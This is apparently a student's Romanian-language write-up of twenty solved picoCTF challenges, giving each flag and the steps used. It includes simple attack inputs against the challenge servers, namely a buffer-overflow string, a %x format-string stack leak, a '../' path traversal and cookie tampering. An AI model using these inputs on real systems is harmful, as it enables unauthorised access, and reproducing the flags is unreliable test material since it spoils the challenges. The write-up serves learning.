Ziua 5 + 6 - 22.06.2022 - 23.06.2022

1. Glory of the Garden - picoCTF{more_than_m33ts_the_3y3657BaB2C}

Am instalat un editor hexa

georgiana@georgiana:~$ sudo apt install ghex

Cu ajutorul cautarii avansate am adaugat un string pe care sa il caute in spatele jpg ului.
Am scris picoCTF in hexa (70 69 63 6F 43 54 46) apoi prima cautare m-a dus la flag ul dorit.

2. login - picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}

georgiana@georgiana:~$ echo "YWRtaW4" | base64 -d
adminbase64: invalid input
georgiana@georgiana:~$ echo "cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ" | base64 -d
picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}base64: invalid input


3. CVE-XXXX-XXXX - picoCTF{CVE-2021-34527}

print spooler service first  rc3 2021

Windows Print Spooler Remote Code Execution Vulnerability
CVE-2021-34527


4. Wireshark twoo twooo two twoo... - picoCTF{dns_3xf1l_ftw_deadbeef}

Am deschis wireshark si am urmarit fluxul si am observat ca a fost transmis acest mesaj: cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ==fQ==

georgiana@georgiana:~$ echo cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ==  | base64 -d
picoCTF{dns_3xf1l_ftw_deadbeef}

5. dont-use-client-side - picoCTF{no_clients_plz_1a3c89}

<html>
<head>
<title>Secure Login Portal</title>
</head>
<body bgcolor=blue>
<!-- standard MD5 implementation -->
<script type="text/javascript" src="md5.js"></script>

<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == 'a3c8') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_1') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == '9}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
<div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:yellow">
<div style="text-align:center">
<p>This is the secure login portal</p>
<p>Enter valid credentials to proceed</p>
<form action="index.html" method="post">
<input type="password" id="pass" size="8" />
<br/>
<input type="submit" value="verify" onclick="verify(); return false;" />
</form>
</div>
</div>
</body>
</html>

6. logon - picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}

login cu orice user si pass, storage, cookies, set True, refresh la pagina

7. where are the robots - picoCTF{ca1cu1at1ng_Mach1n3s_477ce}

https://jupiter.challenges.picoctf.org/problem/36474/
https://jupiter.challenges.picoctf.org/problem/36474/robots.txt
User-agent: *
Disallow: /477ce.html
https://jupiter.challenges.picoctf.org/problem/36474/477ce.html

8. Client-side-again - picoCTF{not_this_again_337115}
not_this_again_337115

'37115}','_again_3','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'

<html>
<head>
<title>Secure Login Portal V2.0</title>
</head>
<body background="barbed_wire.jpeg" >
<!-- standard MD5 implementation -->
<script type="text/javascript" src="md5.js"></script>

<script type="text/javascript">
  var _0x5a46=['37115}','_again_3','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];(function(_0x4bd822,_0x2bd6f7){var _0xb4bdb3=function(_0x1d68f6){while(--_0x1d68f6){_0x4bd822['push'](_0x4bd822['shift']());}};_0xb4bdb3(++_0x2bd6f7);}(_0x5a46,0x1b3));var _0x4b5b=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5a46[_0x2d8f05];return _0x4d74cb;};function verify(){checkpass=document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];split=0x4;if(checkpass[_0x4b5b('0x2')](0x0,split*0x2)==_0x4b5b('0x3')){if(checkpass[_0x4b5b('0x2')](0x7,0x9)=='{n'){if(checkpass[_0x4b5b('0x2')](split*0x2,split*0x2*0x2)==_0x4b5b('0x4')){if(checkpass[_0x4b5b('0x2')](0x3,0x6)=='oCT'){if(checkpass[_0x4b5b('0x2')](split*0x3*0x2,split*0x4*0x2)==_0x4b5b('0x5')){if(checkpass['substring'](0x6,0xb)=='F{not'){if(checkpass[_0x4b5b('0x2')](split*0x2*0x2,split*0x3*0x2)==_0x4b5b('0x6')){if(checkpass[_0x4b5b('0x2')](0xc,0x10)==_0x4b5b('0x7')){alert(_0x4b5b('0x8'));}}}}}}}}else{alert(_0x4b5b('0x9'));}}
</script>
<div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray">
<div style="text-align:center">
<p>New and Improved Login</p>

<p>Enter valid credentials to proceed</p>
<form action="index.html" method="post">
<input type="password" id="pass" size="8" />
<br/>
<input type="submit" value="verify" onclick="verify(); return false;" />
</form>
</div>
</div>
</body>
</html>

9. buffer overflow 0 - picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}

georgiana@georgiana:~/Downloads$ gedit vuln.c &
[2] 7717
[1]   Killed                  gedit sequences.py
georgiana@georgiana:~/Downloads$ nc saturn.picoctf.net 65355
Input: AAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}

10. flag leak - picoCTF{L34k1ng_Fl4g_0ff_St4ck_6aea3c7c}

georgiana@georgiana:~/Downloads$ nc saturn.picoctf.net 51748
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%
Here's a story - 
ffe8c820ffe8c8408049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825f7f90025f7e17ab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f365f6b63336165617d633763fbad2000a8dab2000f7fce990804c00080494100804c000ffe8c90880494182ffe8c9b4ffe8c9c00ffe8c920

hex -> text

11. basic-file-exploit - picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}

georgiana@georgiana:~/Downloads$ nc saturn.picoctf.net 52681
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
hi!
hi!
Please enter the length of your data:
2
2
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}


12. RPS - picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}

georgiana@georgiana:~/Downloads$ nc saturn.picoctf.net 53865
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: scissors
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}

13. Includes - picoCTF{1nclu51v17y_1of2_f7w_2of2_6edef411}

view-source:http://saturn.picoctf.net:59300/style.css
body {
  background-color: lightblue;
}

/*  picoCTF{1nclu51v17y_1of2_  */

view-source:http://saturn.picoctf.net:59300/script.js


14. Inspect HTML - picoCTF{1n5p3t0r_0f_h7ml_8113f7e2}

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>On Histiaeus</title>
  </head>
  <body>
    <h1>On Histiaeus</h1>
    <p>However, according to Herodotus, Histiaeus was unhappy having to stay in
       Susa, and made plans to return to his position as King of Miletus by 
       instigating a revolt in Ionia. In 499 BC, he shaved the head of his 
       most trusted slave, tattooed a message on his head, and then waited for 
       his hair to grow back. The slave was then sent to Aristagoras, who was 
       instructed to shave the slave's head again and read the message, which 
       told him to revolt against the Persians.</p>
    <br>
    <p> Source: Wikipedia on Histiaeus </p>
	<!--picoCTF{1n5p3t0r_0f_h7ml_8113f7e2}-->
  </body>
</html>



function greetings()
{
  alert("This code is in a separate file!");
}

//  f7w_2of2_6edef411}


15. Local Authority - picoCTF{j5_15_7r4n5p4r3n7_05df90c8} 

view-source:http://saturn.picoctf.net:49699/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Secure Customer Portal</title>
  </head>
  <body>

    <h1>Secure Customer Portal</h1>
    
   <p>Only letters and numbers allowed for username and password.</p>
    
    <form role="form" action="login.php" method="post">
      <input type="text" name="username" placeholder="Username" required 
       autofocus></br>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" name="login">Login</button>
    </form>
  </body>
</html>

view-source:http://saturn.picoctf.net:49699/login.php
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Login Page</title>
  </head>
  <body>
    <script src="secure.js"></script>
    
    <p id='msg'></p>
    
    <form hidden action="admin.php" method="post" id="hiddenAdminForm">
      <input type="text" name="hash" required id="adminFormHash">
    </form>
    
    <script type="text/javascript">
      function filter(string) {
        filterPassed = true;
        for (let i =0; i < string.length; i++){
          cc = string.charCodeAt(i);
          
          if ( (cc >= 48 && cc <= 57) ||
               (cc >= 65 && cc <= 90) ||
               (cc >= 97 && cc <= 122) )
          {
            filterPassed = true;     
          }
          else
          {
            return false;
          }
        }
        
        return true;
      }
    
      window.username = "";
      window.password = "";
      
      usernameFilterPassed = filter(window.username);
      passwordFilterPassed = filter(window.password);
      
      if ( usernameFilterPassed && passwordFilterPassed ) {
      
        loggedIn = checkPassword(window.username, window.password);
        
        if(loggedIn)
        {
          document.getElementById('msg').innerHTML = "Log In Successful";
          document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
          document.getElementById('hiddenAdminForm').submit();
        }
        else
        {
          document.getElementById('msg').innerHTML = "Log In Failed";
        }
      }
      else {
        document.getElementById('msg').innerHTML = "Illegal character in username or password."
      }
    </script>
    
  </body>
</html>

view-source:http://saturn.picoctf.net:49699/secure.js



function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}


picoCTF{j5_15_7r4n5p4r3n7_05df90c8} 


16. Search source - picoCTF{1nsp3ti0n_0f_w3bpag3s_ec95fa49}

view-source:http://saturn.picoctf.net:50761/
view-source:http://saturn.picoctf.net:50761/css/style.css

search : picoCTF
/** banner_main picoCTF{1nsp3ti0n_0f_w3bpag3s_ec95fa49} **/

17. Forbidden Paths - picoCTF{7h3_p47h_70_5ucc355_6db46514} 

../../../../flag.txt

18. Power Cookie - picoCTF{gr4d3_A_c00k13_65fd1e1a}

inspect -> storage -> 1

19. Roboto Sans - picoCTF{Who_D03sN7_L1k5_90B0T5_22ce1f22}

view-source:http://saturn.picoctf.net:51108/
view-source:http://saturn.picoctf.net:51108/robots.txt
User-agent *
Disallow: /cgi-bin/
Think you have seen your flag or want to keep looking.

ZmxhZzEudHh0;anMvbXlmaW
anMvbXlmaWxlLnR4dA==
svssshjweuiwl;oiho.bsvdaslejg
Disallow: /wp-admin/

ZmxhZzEudHh0;anMvbXlmaW
anMvbXlmaWxlLnR4dA==
svssshjweuiwl;oiho.bsvdaslejg

transform to base64 => /js/myfile.txt

view-source:http://saturn.picoctf.net:51108/js/myfile.txt

picoCTF{Who_D03sN7_L1k5_90B0T5_22ce1f22}

20. Secrets - picoCTF{succ3ss_@h3n1c@10n_51b260fe}

http://saturn.picoctf.net:50167/
http://saturn.picoctf.net:50167/secret/
http://saturn.picoctf.net:50167/secret/hidden/
http://saturn.picoctf.net:50167/secret/hidden/superhidden/
